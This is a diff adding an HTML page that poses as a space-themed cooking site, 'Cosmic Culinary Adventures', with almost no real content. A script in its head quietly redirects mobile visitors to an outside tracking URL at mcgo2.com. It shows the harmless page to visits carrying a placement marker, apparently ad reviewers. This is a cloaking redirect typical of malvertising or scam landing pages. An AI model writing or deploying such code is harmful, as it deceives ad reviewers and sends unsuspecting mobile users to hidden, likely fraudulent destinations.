@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Culinary Adventures</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(45deg, #FF6B6B, #4ECDC4);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: #45ADA8;
+            padding: 20px;
+            text-align: right;
+        }
+        main {
+            display: grid;
+            grid-template-columns: 1fr 2fr 1fr;
+            gap: 20px;
+            padding: 20px;
+            flex-grow: 1;
+        }
+        .content {
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 15px;
+            transform: skew(-5deg);
+        }
+        h1 {
+            color: #FF6B6B;
+            text-shadow: 2px 2px #594F4F;
+        }
+        footer {
+            background-color: #594F4F;
+            color: #FFF;
+            text-align: center;
+            padding: 10px;
+        }
+        a {
+            color: #4ECDC4;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <nav>
+            <a href="#">Home</a> |
+            <a href="#">Recipes</a> |
+            <a href="#">About</a>
+        </nav>
+    </header>
+    <main>
+        <aside></aside>
+        <section class="content">
+            <h1>Welcome to Cosmic Culinary Adventures</h1>
+            <p>Embark on a gastronomic journey through the stars! Discover recipes from distant galaxies and learn to cook with ingredients from other worlds.</p>
+        </section>
+        <aside></aside>
+    </main>
+    <footer>
+        <p>&copy; 2023 Cosmic Culinary Adventures. <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
